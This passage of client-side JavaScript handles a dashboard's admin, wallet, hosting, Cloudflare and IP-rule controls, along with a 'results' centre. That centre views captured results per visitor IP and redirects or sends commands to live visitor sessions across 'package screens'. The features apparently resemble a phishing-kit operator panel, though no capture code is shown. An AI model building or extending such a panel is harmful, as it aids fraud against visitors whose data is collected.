  const refreshAdminPackagesButton = event.target.closest("[data-refresh-admin-packages]");
  if (refreshAdminPackagesButton) {
    await withButtonBusy(refreshAdminPackagesButton, "Refreshing", () => refreshAdminPackages());
    return;
  }

  const refreshAdminPublishingButton = event.target.closest("[data-refresh-admin-publishing]");
  if (refreshAdminPublishingButton) {
    await withButtonBusy(refreshAdminPublishingButton, "Refreshing", () => refreshAdminPackages({ publishing: true }));
    return;
  }

  const exportAdminUsersButton = event.target.closest("[data-export-admin-users]");
  if (exportAdminUsersButton) {
    exportAdminUsersCsv();
    return;
  }

  const refreshAdminUsersButton = event.target.closest("[data-refresh-admin-users]");
  if (refreshAdminUsersButton) {
    await withButtonBusy(refreshAdminUsersButton, "Refreshing", refreshAdminUsers);
    return;
  }

  const expandAdminUserButton = event.target.closest("[data-admin-user-expand]");
  if (expandAdminUserButton) {
    const userId = expandAdminUserButton.dataset.adminUserExpand;
    if (expandedAdminUsers.has(userId)) expandedAdminUsers.delete(userId);
    else expandedAdminUsers.add(userId);
    renderAdminUsers();
    statusText.textContent = expandedAdminUsers.has(userId) ? "USER CONTROLS EXPANDED" : "USER CONTROLS COLLAPSED";
    return;
  }

  const collabAdminUserButton = event.target.closest("[data-admin-user-collabs]");
  if (collabAdminUserButton) {
    const userId = collabAdminUserButton.dataset.adminUserCollabs;
    if (collabAdminUsers.has(userId)) collabAdminUsers.delete(userId);
    else collabAdminUsers.add(userId);
    renderAdminUsers();
    statusText.textContent = collabAdminUsers.has(userId) ? "USER COLLABS OPEN" : "USER COLLABS HIDDEN";
    return;
  }

  const saveAdminUserButton = event.target.closest("[data-save-admin-user]");
  if (saveAdminUserButton) {
    await withButtonBusy(saveAdminUserButton, "Saving", () => saveAdminUserAccess(saveAdminUserButton.dataset.saveAdminUser));
    return;
  }

  const adminWalletCreditButton = event.target.closest("[data-admin-wallet-credit]");
  if (adminWalletCreditButton) {
    await withButtonBusy(adminWalletCreditButton, "Crediting", () => adjustAdminUserWallet(adminWalletCreditButton.dataset.adminWalletCredit, "credit"));
    return;
  }

  const adminWalletDebitButton = event.target.closest("[data-admin-wallet-debit]");
  if (adminWalletDebitButton) {
    await withButtonBusy(adminWalletDebitButton, "Debiting", () => adjustAdminUserWallet(adminWalletDebitButton.dataset.adminWalletDebit, "debit"));
    return;
  }

  const adminPageExtendButton = event.target.closest("[data-admin-page-extend]");
  if (adminPageExtendButton) {
    await withButtonBusy(adminPageExtendButton, "Extending", () => extendAdminUserPage(adminPageExtendButton.dataset.adminPageExtend));
    return;
  }

  const approveWalletFundButton = event.target.closest("[data-approve-wallet-fund]");
  if (approveWalletFundButton) {
    await withButtonBusy(approveWalletFundButton, "Approving", () => approveWalletFundRequest(approveWalletFundButton));
    return;
  }

  const reviewWalletFundButton = event.target.closest("[data-review-wallet-fund]");
  if (reviewWalletFundButton) {
    await withButtonBusy(reviewWalletFundButton, "Reviewing", () => updateWalletFundReview(reviewWalletFundButton, "reviewing"));
    return;
  }

  const rejectWalletFundButton = event.target.closest("[data-reject-wallet-fund]");
  if (rejectWalletFundButton) {
    await withButtonBusy(rejectWalletFundButton, "Rejecting", () => updateWalletFundReview(rejectWalletFundButton, "reject"));
    return;
  }

  const configButton = event.target.closest("[data-config-page]");
  if (configButton) {
    setAppBusy(true, "Opening config");
    window.location.hash = `config-${configButton.dataset.configPage}`;
    return;
  }

  const goLiveButton = event.target.closest("[data-go-live]");
  if (goLiveButton) {
    setAppBusy(true, "Opening Go Live");
    window.location.hash = `go-live-${goLiveButton.dataset.goLive}`;
    return;
  }

  const securityButton = event.target.closest("[data-security]");
  if (securityButton) {
    setAppBusy(true, "Opening security");
    window.location.hash = `security-${securityButton.dataset.security}:${securityButton.dataset.securityTab}`;
    return;
  }

  const pageLogButton = event.target.closest("[data-page-log]");
  if (pageLogButton) {
    setAppBusy(true, "Opening page log");
    window.location.hash = `security-${pageLogButton.dataset.pageLog}:log`;
    return;
  }

  const resultsButton = event.target.closest("[data-results]");
  if (resultsButton) {
    setAppBusy(true, "Opening results");
    window.location.hash = `results-${resultsButton.dataset.results}`;
    return;
  }

  const selectVisibleResultsButton = event.target.closest("[data-bulk-results-select-visible]");
  if (selectVisibleResultsButton) {
    preview.querySelectorAll("[data-result-select]").forEach((input) => {
      const sessionRow = input.closest("[data-compact-session]");
      if (!sessionRow?.hidden) input.checked = true;
    });
    updateBulkResultsToolbar();
    statusText.textContent = "VISIBLE RESULTS SELECTED";
    return;
  }

  const clearBulkResultsButton = event.target.closest("[data-bulk-results-clear]");
  if (clearBulkResultsButton) {
    preview.querySelectorAll("[data-result-select]:checked").forEach((input) => { input.checked = false; });
    updateBulkResultsToolbar();
    statusText.textContent = "RESULT SELECTION CLEARED";
    return;
  }

  const applyBulkResultsButton = event.target.closest("[data-bulk-results-apply]");
  if (applyBulkResultsButton) {
    const toolbar = applyBulkResultsButton.closest("[data-bulk-results-toolbar]");
    const page = getPageBySlug(toolbar?.dataset.bulkResultsToolbar);
    const action = toolbar?.querySelector("[data-bulk-results-action]")?.value || "review";
    const resultIds = selectedResultIds();
    try {
      await withButtonBusy(applyBulkResultsButton, "Applying", () => runResultsMutation(() => applyBulkResults(page, action, resultIds)));
    } catch (error) {
      statusText.textContent = `BULK ACTION FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const toggleResultsAutoRefreshButton = event.target.closest("[data-toggle-results-auto-refresh]");
  if (toggleResultsAutoRefreshButton) {
    resultsAutoRefreshUserPaused = !resultsAutoRefreshUserPaused;
    if (resultsAutoRefreshUserPaused) {
      updateResultsAutoRefreshStatus("manual");
      statusText.textContent = "LIVE RESULT UPDATES PAUSED";
    } else {
      await withButtonBusy(toggleResultsAutoRefreshButton, "Resuming", () => renderResultsCenter(toggleResultsAutoRefreshButton.dataset.toggleResultsAutoRefresh));
      statusText.textContent = "LIVE RESULT UPDATES RESUMED";
    }
    return;
  }

  const refreshResultsButton = event.target.closest("[data-refresh-results]");
  if (refreshResultsButton) {
    await withButtonBusy(refreshResultsButton, "Refreshing", () => renderResultsCenter(refreshResultsButton.dataset.refreshResults));
    statusText.textContent = "RESULTS CONTROL CENTER REFRESHED";
    return;
  }

  const syncResultScreensButton = event.target.closest("[data-sync-result-screens]");
  if (syncResultScreensButton) {
    const resultPage = getPageBySlug(syncResultScreensButton.dataset.syncResultScreens);
    if (!resultPage) {
      statusText.textContent = "PAGE RECORD NOT FOUND";
      return;
    }
    try {
      await withButtonBusy(syncResultScreensButton, "Syncing", () => runResultsMutation(async () => {
        const result = await requestApi(`/api/user-pages/${resultPage.id}/screens/sync`, { method: "POST" });
        const updated = normalizeUserPage({
          ...result.userPage,
          results: resultPage.results || [],
          activeSessions: resultPage.activeSessions || [],
          runtimeTargets: result.targets || []
        });
        ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
        await renderResultsCenter(pageRouteKey(updated));
      }));
      statusText.textContent = "PACKAGE SCREEN ORDER SYNCED";
    } catch (error) {
      statusText.textContent = `SCREEN SYNC FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const downloadButton = event.target.closest("[data-download-index]");
  if (downloadButton) {
    try {
      downloadGeneratedIndex(getPageBySlug(downloadButton.dataset.downloadIndex));
      downloadButton.textContent = "Download again";
      const card = downloadButton.closest(".go-live-step-card");
      card?.classList.remove("is-active");
      card?.classList.add("is-complete");
      const state = card?.querySelector(".go-live-download-state");
      if (state) {
        state.className = "go-live-download-state is-ready";
        state.textContent = "Downloaded as index.html. Upload this file to the static host root.";
      }
    } catch (error) {
      console.error("Final index download failed", error);
      statusText.textContent = `INDEX DOWNLOAD FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const saveSecurityButton = event.target.closest("[data-save-security]");
  if (saveSecurityButton) {
    await withButtonBusy(saveSecurityButton, "Saving", () => saveSecurityConfig(
      getPageBySlug(saveSecurityButton.dataset.saveSecurity),
      saveSecurityButton.dataset.saveSecurityTab || "security"
    ));
    return;
  }

  const validateTurnstileButton = event.target.closest("[data-validate-turnstile]");
  if (validateTurnstileButton) {
    await withButtonBusy(validateTurnstileButton, "Validating", () => validateTurnstileForPage(getPageBySlug(validateTurnstileButton.dataset.validateTurnstile)));
    return;
  }

  const saveUserConfigButton = event.target.closest("[data-save-user-config]");
  if (saveUserConfigButton) {
    saveUserConfig(getPageBySlug(saveUserConfigButton.dataset.saveUserConfig));
    return;
  }

  const renewPageButton = event.target.closest("[data-renew-page]");
  if (renewPageButton) {
    await withButtonBusy(renewPageButton, "Renewing", () => renewPageFromWallet(getPageBySlug(renewPageButton.dataset.renewPage)));
    return;
  }

  const saveHostingButton = event.target.closest("[data-save-hosting]");
  if (saveHostingButton) {
    saveHostingConfig(getPageBySlug(saveHostingButton.dataset.saveHosting));
    return;
  }

  const verifyHostingButton = event.target.closest("[data-verify-hosting]");
  if (verifyHostingButton) {
    saveHostingConfig(getPageBySlug(verifyHostingButton.dataset.verifyHosting), true);
    return;
  }

  const relaySecretButton = event.target.closest("[data-generate-relay-secret]");
  if (relaySecretButton) {
    await withButtonBusy(relaySecretButton, "Rotating", () => generateRelaySecretForPage(getPageBySlug(relaySecretButton.dataset.generateRelaySecret)));
    return;
  }

  const verifyCloudflareButton = event.target.closest("[data-verify-cloudflare]");
  if (verifyCloudflareButton) {
    await withButtonBusy(verifyCloudflareButton, "Verifying", () => verifyCloudflareForPage(getPageBySlug(verifyCloudflareButton.dataset.verifyCloudflare)));
    return;
  }

  const installCloudflareButton = event.target.closest("[data-install-cloudflare]");
  if (installCloudflareButton) {
    await withButtonBusy(installCloudflareButton, "Installing", () => installCloudflareForPage(getPageBySlug(installCloudflareButton.dataset.installCloudflare)));
    return;
  }

  const securityRemoveIpButton = event.target.closest("[data-security-remove-ip]");
  if (securityRemoveIpButton) {
    const resultPage = getPageBySlug(securityRemoveIpButton.dataset.securityPage);
    const ip = securityRemoveIpButton.dataset.securityRemoveIp || "";
    if (!resultPage || !ip) {
      statusText.textContent = "SECURITY IP REQUIRED";
      return;
    }
    await withButtonBusy(securityRemoveIpButton, "Removing", async () => {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/ip-rule`, {
        method: "DELETE",
        body: JSON.stringify({ ip })
      });
      applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
      await renderSecurityCenter(pageRouteKey(resultPage), "ips");
      statusText.textContent = `${ip} REMOVED FROM IP RULES`;
    }).catch((error) => {
      statusText.textContent = `IP REMOVE FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const trafficIpAction = event.target.closest("[data-traffic-ban-ip], [data-traffic-whitelist-ip]");
  if (trafficIpAction) {
    const resultPage = getPageBySlug(trafficIpAction.dataset.trafficPage);
    const ip = trafficIpAction.dataset.trafficBanIp || trafficIpAction.dataset.trafficWhitelistIp || "";
    if (!resultPage || !ip) {
      statusText.textContent = "TRAFFIC IP REQUIRED";
      return;
    }
    const isBan = Boolean(trafficIpAction.dataset.trafficBanIp);
    await withButtonBusy(trafficIpAction, isBan ? "Banning" : "Trusting", async () => {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/${isBan ? "ban-ip" : "whitelist-ip"}`, {
        method: "POST",
        body: JSON.stringify({ ip })
      });
      applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
      await renderSecurityCenter(pageRouteKey(resultPage), "traffic");
      statusText.textContent = isBan ? `${ip} BANNED` : `${ip} WHITELISTED`;
    }).catch((error) => {
      statusText.textContent = `IP ACTION FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const sessionFilterButton = event.target.closest("[data-session-filter-button]");
  if (sessionFilterButton) {
    event.preventDefault();
    preview.querySelectorAll("[data-session-filter-button]").forEach((button) => {
      const active = button === sessionFilterButton;
      button.classList.toggle("is-active", active);
      button.setAttribute("aria-pressed", active ? "true" : "false");
    });
    applyCompactSessionFilters();
    statusText.textContent = `SESSION VIEW: ${sessionFilterButton.textContent}`.toUpperCase();
    return;
  }

  const sessionRedirectButton = event.target.closest("[data-session-redirect]");
  if (sessionRedirectButton) {
    event.preventDefault();
    const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
    const sessionId = sessionRedirectButton.dataset.sessionRedirect;
    const targetScreenId = String(sessionRedirectButton.dataset.sessionTargetId || "").trim();
    const targetFile = normalizedRuntimeScreenFile(sessionRedirectButton.dataset.sessionTargetFile);
    const forceReload = sessionRedirectButton.dataset.sessionForceReload === "true";
    if (!resultPage || !targetFile) {
      statusText.textContent = "MAPPED PACKAGE PAGE REQUIRED";
      return;
    }
    await withButtonBusy(sessionRedirectButton, "Redirecting", () => runResultsMutation(async () => {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
        method: "POST",
        body: JSON.stringify({ targetScreenId, targetFile, forceReload })
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(pageRouteKey(updated));
      statusText.textContent = "LIVE USER REDIRECT QUEUED";
    })).catch((error) => {
      statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const sessionClearButton = event.target.closest("[data-session-clear]");
  if (sessionClearButton) {
    event.preventDefault();
    const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
    const sessionId = sessionClearButton.dataset.sessionClear;
    if (!resultPage) return;
    await withButtonBusy(sessionClearButton, "Clearing", () => runResultsMutation(async () => {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
        method: "DELETE"
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(pageRouteKey(updated));
      statusText.textContent = "LIVE USER COMMAND CLEARED";
    })).catch((error) => {
      statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
    });
    return;
  }

  const resultAction = event.target.closest("[data-result-page]");
  if (resultAction) {
    const resultPage = getPageBySlug(resultAction.dataset.resultPage);
    if (!resultPage) return;
    const resultId = resultAction.dataset.viewResult || resultAction.dataset.deleteResult || resultAction.dataset.banResultIp || resultAction.dataset.whitelistResultIp;
    const result = (resultPage.results || []).find((item) => item.id === resultId);
    if (!result) return;

    if (resultAction.dataset.viewResult) {
      await withButtonBusy(resultAction, "Opening", () => openResultViewer(resultPage, result.id, resultAction)).catch((error) => {
        statusText.textContent = `RESULT VIEWER FAILED: ${error.message}`.toUpperCase();
      });
      return;
    }

    if (resultAction.dataset.deleteResult) {
      await withButtonBusy(resultAction, "Deleting", () => runResultsMutation(async () => {
        await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
        resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = "RESULT DELETED";
      }));
      return;
    }

    if (resultAction.dataset.banResultIp) {
      await withButtonBusy(resultAction, "Banning", () => runResultsMutation(async () => {
        const updated = await requestApi(`/api/user-pages/${resultPage.id}/ban-ip`, {
          method: "POST",
          body: JSON.stringify({ ip: result.ip })
        });
        applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = `${result.ip} BANNED`;
      }));
      return;
    }

    if (resultAction.dataset.whitelistResultIp) {
      await withButtonBusy(resultAction, "Trusting", () => runResultsMutation(async () => {
        const updated = await requestApi(`/api/user-pages/${resultPage.id}/whitelist-ip`, {
          method: "POST",
          body: JSON.stringify({ ip: result.ip })
        });
        applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
        await renderResultsCenter(pageRouteKey(resultPage));
        statusText.textContent = `${result.ip} WHITELISTED`;
      }));
      return;
    }
  }

});
preview.addEventListener("toggle", (event) => {
  if (event.target.matches?.("[data-compact-session]")) updateResultsAutoRefreshStatus();
}, true);
preview.addEventListener("change", (event) => {
  if (event.target.matches?.("[data-package-screen-entry], [data-package-screen-final], [data-package-screen-final-none]")) {
    refreshImportedScreenOrder();
    statusText.textContent = "SCREEN MAPPING CHANGED / SAVE DRAFT TO PERSIST";
  }
});
preview.addEventListener("dragstart", (event) => {
  const row = event.target.closest?.("[data-package-screen-row]");
  if (!row) return;
  draggedScreenName = row.dataset.packageScreenRow;
  row.classList.add("dragging");
  event.dataTransfer?.setData("text/plain", draggedScreenName);
  if (event.dataTransfer) event.dataTransfer.effectAllowed = "move";
});

preview.addEventListener("dragover", (event) => {
  const target = event.target.closest?.("[data-package-screen-row]");
  if (!target || !draggedScreenName) return;
  const dragged = [...preview.querySelectorAll("[data-package-screen-row]")].find((row) => row.dataset.packageScreenRow === draggedScreenName);
  if (!dragged || dragged === target) return;
  event.preventDefault();
  const bounds = target.getBoundingClientRect();
  target.parentElement.insertBefore(dragged, event.clientY < bounds.top + bounds.height / 2 ? target : target.nextElementSibling);
  refreshImportedScreenOrder();
});

preview.addEventListener("drop", (event) => {
  if (!draggedScreenName) return;
  event.preventDefault();
  statusText.textContent = "SCREEN ORDER CHANGED / SAVE DRAFT TO PERSIST";
});

preview.addEventListener("dragend", () => {
  preview.querySelectorAll("[data-package-screen-row].dragging").forEach((row) => row.classList.remove("dragging"));
  draggedScreenName = null;
  refreshImportedScreenOrder();
});

document.addEventListener("click", (event) => {
  const viewer = event.target.closest?.("[data-result-viewer]");
  if (!viewer) return;
  const closeButton = event.target.closest?.("[data-close-result-viewer]");
  if (closeButton || event.target === viewer) {
    closeResultViewer();
    return;
  }
  const stepButton = event.target.closest?.("[data-result-viewer-step]");
  if (stepButton) selectResultViewerResult(stepButton.dataset.resultViewerStep);
});

document.addEventListener("keydown", (event) => {
  if (event.key === "Escape" && activeResultViewer) closeResultViewer();
});
